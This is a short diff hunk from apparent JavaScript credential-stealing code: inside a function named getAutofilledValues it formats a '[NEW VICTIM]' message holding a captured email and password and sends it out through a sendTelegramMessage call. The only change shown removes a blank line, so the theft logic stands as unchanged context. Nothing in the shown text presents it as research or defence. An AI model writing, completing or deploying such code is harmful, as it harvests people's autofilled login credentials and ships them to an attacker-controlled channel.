@@ -31,5 +31,4 @@ function getAutofilledValues() {
         var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found`;
         sendTelegramMessage(message); 
     });
-
 }
